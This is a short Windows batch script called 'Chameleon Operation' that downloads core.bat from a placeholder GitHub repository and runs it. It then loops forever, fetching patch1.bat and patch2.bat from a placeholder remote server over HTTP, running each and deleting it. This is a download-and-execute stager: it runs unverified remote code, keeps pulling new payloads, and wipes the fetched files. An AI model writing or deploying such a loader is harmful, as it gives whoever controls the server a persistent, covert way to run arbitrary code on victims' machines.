@echo off  
setlocal

echo Initiating Chameleon Operation...

:initial_download  
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/YOUR_GITHUB_USERNAME/YOUR_CHAMELEON_REPO/raw/main/core.bat', 'core.bat')"

:execute_core  
call core.bat

:patch_loop  
timeout /t 60 /nobreak > nul  REM Wait 60 seconds  
powershell -Command "(New-Object Net.WebClient).DownloadFile('http://your.remote.server/patch1.bat', 'patch1.bat')"  
call patch1.bat  
del patch1.bat  
timeout /t 30 /nobreak > nul  REM Wait 30 seconds  
powershell -Command "(New-Object Net.WebClient).DownloadFile('http://your.remote.server/patch2.bat', 'patch2.bat')"  
call patch2.bat  
del patch2.bat

goto :patch_loop

endlocal  
exit  